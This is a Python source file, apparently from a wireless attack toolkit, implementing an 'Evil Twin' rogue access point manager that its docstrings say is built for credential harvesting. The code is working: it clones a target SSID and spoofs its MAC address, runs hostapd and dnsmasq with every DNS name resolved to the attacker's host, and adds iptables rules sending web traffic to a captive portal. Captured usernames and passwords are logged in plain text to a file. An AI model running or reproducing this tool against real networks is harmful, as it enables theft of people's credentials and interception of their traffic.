"""
Evil Twin AP Manager - Fake Access Point creation using hostapd.

Creates rogue APs to attract clients for credential harvesting.
Requires: hostapd, dnsmasq, iptables
"""

from __future__ import annotations

import asyncio
import logging
import shutil
import tempfile
from dataclasses import dataclass, field
from datetime import UTC, datetime
from enum import Enum
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


class APStatus(str, Enum):
    """Access Point status."""
    STOPPED = "stopped"
    STARTING = "starting"
    RUNNING = "running"
    STOPPING = "stopping"
    ERROR = "error"


@dataclass
class APConfig:
    """Evil Twin AP configuration."""
    interface: str = "wlan1"  # Interface for AP (needs AP mode support)
    ssid: str = "FreeWiFi"
    channel: int = 6
    hw_mode: str = "g"  # a/b/g/n
    
    # Security (open for evil twin)
    encryption: str = "open"  # open, wpa2
    password: str | None = None
    
    # Network config
    ip_address: str = "192.168.4.1"
    netmask: str = "255.255.255.0"
    dhcp_start: str = "192.168.4.10"
    dhcp_end: str = "192.168.4.100"
    dhcp_lease: str = "12h"
    
    # Captive portal
    enable_portal: bool = True
    portal_port: int = 80
    
    # Paths
    hostapd_path: str = "/usr/sbin/hostapd"
    dnsmasq_path: str = "/usr/sbin/dnsmasq"
    
    # Logging
    log_dir: Path = field(default_factory=lambda: Path("logs/eviltwin"))


@dataclass
class ConnectedClient:
    """Client connected to the evil twin AP."""
    mac_address: str
    ip_address: str | None = None
    hostname: str | None = None
    connected_at: datetime = field(default_factory=lambda: datetime.now(UTC))
    last_seen: datetime = field(default_factory=lambda: datetime.now(UTC))
    credentials_captured: bool = False
    
    def to_dict(self) -> dict[str, Any]:
        return {
            "mac_address": self.mac_address,
            "ip_address": self.ip_address,
            "hostname": self.hostname,
            "connected_at": self.connected_at.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "credentials_captured": self.credentials_captured,
        }


class APManager:
    """
    Evil Twin Access Point Manager.
    
    Creates fake APs using hostapd and dnsmasq to attract clients.
    Redirects all traffic to captive portal for credential harvesting.
    
    Usage:
        manager = APManager(config)
        await manager.start()
        
        # Clone a target network
        await manager.clone_ap("TargetSSID", channel=6)
        
        # Check connected clients
        for client in manager.clients:
            print(f"Connected: {client.mac_address}")
        
        await manager.stop()
    """
    
    def __init__(self, config: APConfig | None = None) -> None:
        self.config = config or APConfig()
        self._status = APStatus.STOPPED
        self._hostapd_proc: asyncio.subprocess.Process | None = None
        self._dnsmasq_proc: asyncio.subprocess.Process | None = None
        self._clients: dict[str, ConnectedClient] = {}
        self._temp_dir: Path | None = None
        self._lock = asyncio.Lock()
        
        self._stats = {
            "sessions_started": 0,
            "clients_total": 0,
            "credentials_captured": 0,
            "errors": 0,
        }
    
    @property
    def status(self) -> APStatus:
        return self._status
    
    @property
    def clients(self) -> list[ConnectedClient]:
        return list(self._clients.values())
    
    @property
    def stats(self) -> dict[str, int]:
        return dict(self._stats)
    
    async def start(self) -> bool:
        """
        Initialize the AP manager.
        
        Returns:
            True if hostapd and dnsmasq are available.
        """
        # Check dependencies
        if not shutil.which(self.config.hostapd_path):
            if not shutil.which("hostapd"):
                logger.error("hostapd not found")
                return False
            self.config.hostapd_path = "hostapd"
        
        if not shutil.which(self.config.dnsmasq_path):
            if not shutil.which("dnsmasq"):
                logger.error("dnsmasq not found")
                return False
            self.config.dnsmasq_path = "dnsmasq"
        
        # Create temp directory for config files
        self._temp_dir = Path(tempfile.mkdtemp(prefix="momo_eviltwin_"))
        
        # Ensure log directory exists
        self.config.log_dir.mkdir(parents=True, exist_ok=True)
        
        logger.info("Evil Twin AP Manager initialized")
        return True
    
    async def stop(self) -> None:
        """Stop the AP and cleanup."""
        await self._stop_ap()
        
        # Cleanup temp files
        if self._temp_dir and self._temp_dir.exists():
            import shutil as sh
            sh.rmtree(self._temp_dir, ignore_errors=True)
        
        logger.info("Evil Twin AP Manager stopped")
    
    async def create_ap(
        self,
        ssid: str | None = None,
        channel: int | None = None,
        interface: str | None = None,
    ) -> bool:
        """
        Create and start the evil twin AP.
        
        Args:
            ssid: Network name (uses config default if None)
            channel: WiFi channel (uses config default if None)
            interface: Interface to use (uses config default if None)
        
        Returns:
            True if AP started successfully.
        """
        async with self._lock:
            if self._status == APStatus.RUNNING:
                logger.warning("AP already running")
                return True
            
            self._status = APStatus.STARTING
            
            # Apply overrides
            if ssid:
                self.config.ssid = ssid
            if channel:
                self.config.channel = channel
            if interface:
                self.config.interface = interface
            
            try:
                # Configure interface
                if not await self._setup_interface():
                    self._status = APStatus.ERROR
                    return False
                
                # Start hostapd
                if not await self._start_hostapd():
                    self._status = APStatus.ERROR
                    return False
                
                # Start dnsmasq
                if not await self._start_dnsmasq():
                    await self._stop_hostapd()
                    self._status = APStatus.ERROR
                    return False
                
                # Setup iptables for captive portal redirect
                if self.config.enable_portal:
                    await self._setup_iptables()
                
                self._status = APStatus.RUNNING
                self._stats["sessions_started"] += 1
                
                logger.info(
                    "Evil Twin AP started: SSID=%s, Channel=%d, Interface=%s",
                    self.config.ssid,
                    self.config.channel,
                    self.config.interface,
                )
                return True
                
            except Exception as e:
                logger.error("Failed to start AP: %s", e)
                self._stats["errors"] += 1
                self._status = APStatus.ERROR
                return False
    
    async def clone_ap(
        self,
        ssid: str,
        bssid: str | None = None,
        channel: int = 6,
    ) -> bool:
        """
        Clone an existing AP (Evil Twin attack).
        
        Args:
            ssid: Target network SSID to clone
            bssid: Optional - spoof MAC to match target
            channel: Channel to operate on
        
        Returns:
            True if clone AP started successfully.
        """
        # If BSSID provided, try to spoof MAC
        if bssid:
            await self._spoof_mac(bssid)
        
        return await self.create_ap(ssid=ssid, channel=channel)
    
    async def _setup_interface(self) -> bool:
        """Configure the interface for AP mode."""
        interface = self.config.interface
        ip = self.config.ip_address
        netmask = self.config.netmask
        
        try:
            # Bring interface down
            proc = await asyncio.create_subprocess_exec(
                "ip", "link", "set", interface, "down",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await proc.wait()
            
            # Set IP address
            proc = await asyncio.create_subprocess_exec(
                "ip", "addr", "flush", "dev", interface,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await proc.wait()
            
            proc = await asyncio.create_subprocess_exec(
                "ip", "addr", "add", f"{ip}/24", "dev", interface,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await proc.wait()
            
            # Bring interface up
            proc = await asyncio.create_subprocess_exec(
                "ip", "link", "set", interface, "up",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await proc.wait()
            
            return True
            
        except Exception as e:
            logger.error("Failed to setup interface: %s", e)
            return False
    
    async def _start_hostapd(self) -> bool:
        """Start hostapd with generated config."""
        if self._temp_dir is None:
            return False
        
        # Generate hostapd config
        config_content = self._generate_hostapd_config()
        config_path = self._temp_dir / "hostapd.conf"
        config_path.write_text(config_content)
        
        try:
            self._hostapd_proc = await asyncio.create_subprocess_exec(
                self.config.hostapd_path,
                str(config_path),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            # Wait briefly for startup
            await asyncio.sleep(1.0)
            
            if self._hostapd_proc.returncode is not None:
                stderr = await self._hostapd_proc.stderr.read()
                logger.error("hostapd failed: %s", stderr.decode())
                return False
            
            logger.debug("hostapd started")
            return True
            
        except Exception as e:
            logger.error("Failed to start hostapd: %s", e)
            return False
    
    async def _stop_hostapd(self) -> None:
        """Stop hostapd process."""
        if self._hostapd_proc:
            self._hostapd_proc.terminate()
            try:
                await asyncio.wait_for(self._hostapd_proc.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                self._hostapd_proc.kill()
            self._hostapd_proc = None
    
    async def _start_dnsmasq(self) -> bool:
        """Start dnsmasq for DHCP and DNS."""
        if self._temp_dir is None:
            return False
        
        # Generate dnsmasq config
        config_content = self._generate_dnsmasq_config()
        config_path = self._temp_dir / "dnsmasq.conf"
        config_path.write_text(config_content)
        
        try:
            self._dnsmasq_proc = await asyncio.create_subprocess_exec(
                self.config.dnsmasq_path,
                "-C", str(config_path),
                "-d",  # Don't daemonize
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            await asyncio.sleep(0.5)
            
            if self._dnsmasq_proc.returncode is not None:
                stderr = await self._dnsmasq_proc.stderr.read()
                logger.error("dnsmasq failed: %s", stderr.decode())
                return False
            
            logger.debug("dnsmasq started")
            return True
            
        except Exception as e:
            logger.error("Failed to start dnsmasq: %s", e)
            return False
    
    async def _stop_dnsmasq(self) -> None:
        """Stop dnsmasq process."""
        if self._dnsmasq_proc:
            self._dnsmasq_proc.terminate()
            try:
                await asyncio.wait_for(self._dnsmasq_proc.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                self._dnsmasq_proc.kill()
            self._dnsmasq_proc = None
    
    async def _stop_ap(self) -> None:
        """Stop all AP services."""
        self._status = APStatus.STOPPING
        
        await self._cleanup_iptables()
        await self._stop_dnsmasq()
        await self._stop_hostapd()
        
        self._status = APStatus.STOPPED
    
    async def _setup_iptables(self) -> None:
        """Setup iptables for captive portal redirect."""
        ip = self.config.ip_address
        port = self.config.portal_port
        interface = self.config.interface
        
        # Enable IP forwarding
        proc = await asyncio.create_subprocess_shell(
            "echo 1 > /proc/sys/net/ipv4/ip_forward",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
        
        # Redirect HTTP to captive portal
        commands = [
            f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination {ip}:{port}",
            f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to-destination {ip}:{port}",
            f"iptables -A FORWARD -i {interface} -j ACCEPT",
        ]
        
        for cmd in commands:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await proc.wait()
    
    async def _cleanup_iptables(self) -> None:
        """Remove iptables rules."""
        proc = await asyncio.create_subprocess_shell(
            "iptables -t nat -F && iptables -F FORWARD",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
    
    async def _spoof_mac(self, target_mac: str) -> bool:
        """Spoof interface MAC address."""
        interface = self.config.interface
        
        try:
            # Bring down
            proc = await asyncio.create_subprocess_exec(
                "ip", "link", "set", interface, "down",
            )
            await proc.wait()
            
            # Change MAC
            proc = await asyncio.create_subprocess_exec(
                "ip", "link", "set", interface, "address", target_mac,
            )
            await proc.wait()
            
            # Bring up
            proc = await asyncio.create_subprocess_exec(
                "ip", "link", "set", interface, "up",
            )
            await proc.wait()
            
            logger.info("MAC spoofed to %s", target_mac)
            return True
            
        except Exception as e:
            logger.error("MAC spoof failed: %s", e)
            return False
    
    def _generate_hostapd_config(self) -> str:
        """Generate hostapd configuration file content."""
        cfg = self.config
        
        config = f"""# MoMo Evil Twin - hostapd config
interface={cfg.interface}
driver=nl80211
ssid={cfg.ssid}
hw_mode={cfg.hw_mode}
channel={cfg.channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        
        if cfg.encryption == "wpa2" and cfg.password:
            config += f"""
wpa=2
wpa_passphrase={cfg.password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
"""
        
        return config
    
    def _generate_dnsmasq_config(self) -> str:
        """Generate dnsmasq configuration file content."""
        cfg = self.config
        
        return f"""# MoMo Evil Twin - dnsmasq config
interface={cfg.interface}
dhcp-range={cfg.dhcp_start},{cfg.dhcp_end},{cfg.netmask},{cfg.dhcp_lease}
address=/#/{cfg.ip_address}
log-queries
log-dhcp
"""
    
    def add_client(self, mac: str, ip: str | None = None) -> ConnectedClient:
        """Add a connected client."""
        mac = mac.upper()
        
        if mac in self._clients:
            self._clients[mac].last_seen = datetime.now(UTC)
            if ip:
                self._clients[mac].ip_address = ip
            return self._clients[mac]
        
        client = ConnectedClient(mac_address=mac, ip_address=ip)
        self._clients[mac] = client
        self._stats["clients_total"] += 1
        
        logger.info("New client connected: %s (%s)", mac, ip or "no IP")
        return client
    
    def record_credential(self, mac: str, username: str, password: str) -> None:
        """Record captured credentials."""
        if mac.upper() in self._clients:
            self._clients[mac.upper()].credentials_captured = True
        
        self._stats["credentials_captured"] += 1
        
        # Log to file
        log_file = self.config.log_dir / "credentials.log"
        with log_file.open("a") as f:
            f.write(
                f"{datetime.now(UTC).isoformat()}|{mac}|{username}|{password}\n"
            )
        
        logger.warning("Credential captured from %s", mac)
    
    def get_metrics(self) -> dict[str, Any]:
        """Get Prometheus-compatible metrics."""
        return {
            "momo_eviltwin_sessions_total": self._stats["sessions_started"],
            "momo_eviltwin_clients_total": self._stats["clients_total"],
            "momo_eviltwin_credentials_total": self._stats["credentials_captured"],
            "momo_eviltwin_errors_total": self._stats["errors"],
            "momo_eviltwin_status": 1 if self._status == APStatus.RUNNING else 0,
            "momo_eviltwin_connected_clients": len(self._clients),
        }


class MockAPManager(APManager):
    """Mock AP Manager for testing."""
    
    def __init__(self, config: APConfig | None = None) -> None:
        super().__init__(config)
        self._mock_success = True
    
    def set_mock_success(self, success: bool) -> None:
        self._mock_success = success
    
    async def start(self) -> bool:
        self._temp_dir = Path(tempfile.mkdtemp(prefix="momo_mock_"))
        return True
    
    async def create_ap(
        self,
        ssid: str | None = None,
        channel: int | None = None,
        interface: str | None = None,
    ) -> bool:
        if not self._mock_success:
            self._status = APStatus.ERROR
            return False
        
        if ssid:
            self.config.ssid = ssid
        if channel:
            self.config.channel = channel
        
        self._status = APStatus.RUNNING
        self._stats["sessions_started"] += 1
        return True
    
    async def _stop_ap(self) -> None:
        self._status = APStatus.STOPPED

